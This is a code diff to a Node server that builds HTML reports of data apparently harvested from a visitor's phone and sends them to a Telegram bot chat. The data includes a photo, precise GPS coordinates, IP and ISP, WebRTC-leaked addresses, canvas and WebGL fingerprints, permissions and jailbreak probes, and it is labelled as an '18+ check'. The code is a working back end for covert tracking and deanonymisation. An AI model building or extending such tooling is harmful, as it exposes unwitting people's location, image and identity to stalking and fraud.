@@ -1,4 +1,4 @@
-// === server/index.js (code -> chat_id, pretty /:code, JB summary in caption) ===
+// === server/index.js (code -> chat_id, pretty /:code, JB summary in caption + HTML report) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -143,6 +143,193 @@ function gmLink(lat, lon, z = 17) {
   return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
 }
 
+// [NEW] --- отправка HTML отчёта как документа в TG
+async function sendDocumentToTelegram({ chatId, htmlString, filename = 'report.html' }) {
+  if (!BOT_TOKEN) throw new Error('No BOT token on server');
+  if (!chatId) throw new Error('Missing chat_id');
+
+  const form = new FormData();
+  form.append('chat_id', chatId);
+  form.append('document', new Blob([htmlString], { type: 'text/html; charset=utf-8' }), filename);
+
+  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+  const resp = await fetch(url, { method: 'POST', body: form });
+  if (!resp.ok) {
+    const text = await resp.text().catch(() => '');
+    throw new Error(`Telegram ${resp.status}: ${text}`);
+  }
+  return resp.json();
+}
+
+// [NEW] --- HTML Report builder (с расшифровкой)
+function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
+  const jb = (cp?.jbProbesActive) || {};
+  const jbSum = jb.summary || {};
+  const fp = jb.firstPositive || null;
+  const jbResults = Array.isArray(jb.results) ? jb.results : [];
+
+  const pubIP = cp?.publicIp || {};
+  const net   = cp?.network || {};
+  const bat   = cp?.battery || null;
+  const webgl = cp?.webgl || null;
+  const canvas= cp?.canvasFingerprint || null;
+  const inApp = cp?.inAppWebView || {};
+  const locale= cp?.locale || {};
+  const webrtcCount = Array.isArray(cp?.webrtcIps) ? cp.webrtcIps.length : 0;
+  const dcWords = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
+
+  const jsonPretty = safeJson({
+    geo, userAgent, platform, iosVersion, isSafari,
+    client_profile: cp, device_check: dc
+  }, 2);
+
+  const css = `
+    :root { color-scheme: light dark; }
+    body { font: 14px/1.45 system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 0; padding: 24px; }
+    .wrap { max-width: 980px; margin: 0 auto; }
+    h1 { margin: 0 0 4px; font-size: 20px; }
+    .muted { color: #6b7280; font-size: 12px; }
+    .card { background: rgba(0,0,0,0.04); border: 1px solid rgba(0,0,0,0.08); padding: 16px; border-radius: 12px; margin: 14px 0; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid rgba(0,0,0,0.2); padding: 8px; text-align: left; vertical-align: top; }
+    th { background: rgba(0,0,0,0.06); }
+    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    pre { white-space: pre-wrap; word-break: break-word; background: rgba(0,0,0,0.04); padding: 12px; border-radius: 10px; }
+    details { background: rgba(0,0,0,0.04); border: 1px dashed rgba(0,0,0,0.2); padding: 10px 12px; border-radius: 10px; }
+    summary { cursor: pointer; font-weight: 600; }
+    .kv { display: grid; grid-template-columns: 220px 1fr; gap: 8px; }
+    .kv div { padding: 6px 8px; border-bottom: 1px dashed rgba(0,0,0,0.12); }
+    .ok { color:#16a34a; font-weight:600 }
+    .bad { color:#ef4444; font-weight:600 }
+    .soft { color:#2563eb; }
+  `;
+
+  const jbInfo = fp?.scheme
+    ? `Сработала схема <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'signal')} ~${escapeHTML(fp.durationMs||'0')}ms)`
+    : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
+        ? `Признаки: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
+        : 'Признаков не обнаружено');
+
+  const checkStr = dc ? `${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})` : '—';
+
+  const geoStr = geo
+    ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(geo.acc)} м`
+    : 'нет данных';
+
+  const tableJb = jbResults.length
+    ? `
+      <div class="card">
+        <h2>Попытки JB-сигналов</h2>
+        <table>
+          <thead><tr><th>scheme</th><th>opened</th><th>reason</th><th>ms</th></tr></thead>
+          <tbody>
+            ${jbResults.slice(0, 100).map(r => `
+              <tr>
+                <td><code>${escapeHTML(String(r.scheme||'').trim())}</code></td>
+                <td>${r.opened ? '<span class="ok">yes</span>' : 'no'}</td>
+                <td><code>${escapeHTML(r.reason || (r.opened ? 'signal' : 'timeout'))}</code></td>
+                <td>${r.durationMs != null ? escapeHTML(String(r.durationMs)) : '-'}</td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+        ${jbResults.length > 100 ? `<div class="muted">Показаны первые 100 из ${jbResults.length}</div>` : ''}
+      </div>`
+    : '';
+
+  const explain = `
+    <div class="card">
+      <h2>Что это значит (расшифровка)</h2>
+      <ul>
+        <li><b>JB</b> — краткий итог проверки на джейлбрейк. <i>positive</i> — есть сигналы, <i>negative</i> — нет.</li>
+        <li><b>JB info</b> — какая схема/признак сработала и за сколько миллисекунд.</li>
+        <li><b>iOS / Platform / UA</b> — версия системы, платформа и строка User-Agent с браузера.</li>
+        <li><b>Geo</b> — координаты со ссылкой на Google Maps и точность (±м).</li>
+        <li><b>IP / ISP</b> — публичный IP, страна, провайдер. Если странно совпадает с дата-центрами — выделяем в <code>DC-ISP</code>.</li>
+        <li><b>WebRTC IPs</b> — сколько внутренних IP удалось извлечь через WebRTC (признак VPN/Proxy иногда заметен).</li>
+        <li><b>Network</b> — тип канала (2g/3g/4g/5g/wifi) и оценка задержки.</li>
+        <li><b>Battery</b> — уровень батареи и факт зарядки (если доступно, зависит от браузера).</li>
+        <li><b>WebGL / Canvas</b> — косвенные параметры «железа» и хэш канваса для похожести/уникальности.</li>
+        <li><b>In-App</b> — признаки открытия внутри приложения (Telegram/FB/Insta WebView и т.п.).</li>
+        <li><b>TZ / Locale</b> — часовой пояс/языки. Несоответствия с гео/IP бывают подозрительны.</li>
+        <li><b>Check</b> — интегральная метка и числовой балл девайс-чека.</li>
+      </ul>
+    </div>
+  `;
+
+  const top = `
+    <div class="card">
+      <h1>Отчёт по проверке устройства</h1>
+      <div class="muted">Code: <code>${escapeHTML(String(code).toUpperCase())}</code></div>
+      <div class="kv" style="margin-top:10px">
+        <div><b>JB</b></div><div><code>${escapeHTML(jbSum.label || 'n/a')}</code></div>
+        <div><b>JB info</b></div><div>${jbInfo}</div>
+        <div><b>iOS</b></div><div><code>${escapeHTML(iosVersion ?? '')}</code></div>
+        <div><b>Platform</b></div><div><code>${escapeHTML(platform || '')}</code></div>
+        <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
+        <div><b>Geo</b></div><div>${geoStr}</div>
+        <div><b>IP / ISP</b></div><div>${pubIP.ip ? `<code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> · <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'нет'}</div>
+        <div><b>WebRTC IPs</b></div><div><code>${webrtcCount}</code> · DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code></div>
+        <div><b>Network</b></div><div><code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code></div>
+        <div><b>Battery</b></div><div>${bat ? `<code>${bat.level}%${bat.charging ? ' (chg)' : ''}</code>` : '—'}</div>
+        <div><b>WebGL</b></div><div>${webgl ? `<code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : '—'}</div>
+        <div><b>Canvas</b></div><div>${canvas ? `<code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : '—'}</div>
+        <div><b>In-App</b></div><div>${inApp?.isInApp ? `<code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'нет'}</div>
+        <div><b>TZ</b></div><div>${locale?.timeZone ? `<code>${escapeHTML(locale.timeZone)}</code>` : '—'}</div>
+        <div><b>Check</b></div><div><code>${checkStr}</code></div>
+      </div>
+    </div>
+  `;
+
+  const perms = cp?.permissions ? `
+    <div class="card">
+      <h2>Разрешения</h2>
+      <table>
+        <thead><tr><th>Гео</th><th>Камера</th><th>Микрофон</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>${escapeHTML(String(cp.permissions.geolocation ?? '?'))}</code></td>
+            <td><code>${escapeHTML(String(cp.permissions.camera ?? '?'))}</code></td>
+            <td><code>${escapeHTML(String(cp.permissions.microphone ?? '?'))}</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  ` : '';
+
+  const raw = `
+    <div class="card">
+      <details open>
+        <summary>Сырой JSON</summary>
+        <pre>${escapeHTML(jsonPretty)}</pre>
+      </details>
+    </div>
+  `;
+
+  const html = `
+    <!doctype html>
+    <html lang="ru">
+    <head>
+      <meta charset="utf-8"/>
+      <meta name="viewport" content="width=device-width, initial-scale=1"/>
+      <title>Отчёт проверки — ${escapeHTML(String(code).toUpperCase())}</title>
+      <style>${css}</style>
+    </head>
+    <body>
+      <div class="wrap">
+        ${top}
+        ${tableJb}
+        ${perms}
+        ${explain}
+        ${raw}
+        <div class="muted">Сформировано автоматически • ${new Date().toISOString()}</div>
+      </div>
+    </body>
+    </html>
+  `;
+  return html;
+}
+
 // ==== health & debug ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
 app.get('/api/debug/db', (_req, res) => {
@@ -198,7 +385,7 @@ app.get('/api/client-ip', (req, res) => {
   res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
 });
 
-// ==== API: report (фото + сводка, JB summary, JB table, полный JSON) ====
+// ==== API: report (фото + сводка, JB summary, JB table, полный JSON + HTML) ====
 app.post('/api/report', async (req, res) => {
   try {
     const {
@@ -236,31 +423,24 @@ app.post('/api/report', async (req, res) => {
     const jbSum = jb.summary || {};
     const fp = jb.firstPositive || null;
 
-    // ====== КАПШН (тестовая часть) В ТВОЕМ ПОРЯДКЕ ======
+    // ====== КАПШН (тестовая часть) — твой порядок ======
     const linesTop = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
-      // Есть ли джейлбрейк
       `JB: <code>${escapeHTML(jbSum.label || 'n/a')}</code>`,
-      // Причина / доп. инфа
       (fp?.scheme
-        ? `JB info: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'reason?')} ~${escapeHTML(fp.durationMs||'0')}ms)`
+        ? `JB info: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'signal')} ~${escapeHTML(fp.durationMs||'0')}ms)`
         : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
             ? `JB info: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
             : `JB info: <code>—</code>`)),
-      // Версия iOS
       `iOS: <code>${escapeHTML(iosVersion ?? '')}</code>`,
-      // Платформа
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
-      // UA
       `UA: <code>${escapeHTML(userAgent || '')}</code>`,
-      // Гео — ссылкой на Google Maps
       (geo
         ? `Geo: ${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(geo.acc)}</code>m`
         : 'Geo: <code>нет</code>')
     ];
 
-    // ====== «ОСТАЛЬНОЕ» (краткий мультисбор и девайс-чек) ======
     const linesRest = [
       cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
       pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
@@ -285,7 +465,7 @@ app.post('/api/report', async (req, res) => {
       photoBuf: buf
     });
 
-    // 1.1) Компактна таблиця JB-спроб (якщо є)
+    // 1.1) Компактная таблица JB-спроб (если есть)
     const jbResults = Array.isArray(jb.results) ? jb.results : [];
     if (jbResults.length) {
       const head = 'scheme | opened | reason | ms';
@@ -304,13 +484,13 @@ app.post('/api/report', async (req, res) => {
       });
     }
 
-    // 2) Повний JSON мультизбору і девайс-чеку — чанками (НЕ ЧІПАВ)
+    // 2) Полный JSON мультисбора и девайс-чека — чанками (оставил как было)
     const fullJson = safeJson({
       geo, userAgent, platform, iosVersion, isSafari,
       client_profile: cp, device_check: dc
     }, 2);
 
-    const CHUNK = 3500; // запас нижче ліміту 4096
+    const CHUNK = 3500; // запас ниже лимита 4096
     for (let i = 0; i < fullJson.length; i += CHUNK) {
       const part = fullJson.slice(i, i + CHUNK);
       await sendMessageToTelegram({
@@ -318,6 +498,23 @@ app.post('/api/report', async (req, res) => {
         text: `<b>Детали (${1 + Math.floor(i / CHUNK)})</b>\n<pre>${escapeHTML(part)}</pre>`,
         parse_mode: 'HTML'
       });
+    }
+
+    // [NEW] 3) Генерация и отправка ОДНОГО HTML-файла с расшифровкой
+    try {
+      const html = buildHtmlReport({
+        code, geo, userAgent, platform, iosVersion, isSafari,
+        cp, dc
+      });
+      const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
+      await sendDocumentToTelegram({
+        chatId: String(row.chat_id),
+        htmlString: html,
+        filename: fname
+      });
+    } catch (e) {
+      console.error('[report] HTML send failed:', e);
+      // Не роняем основной ответ
     }
 
     res.json({
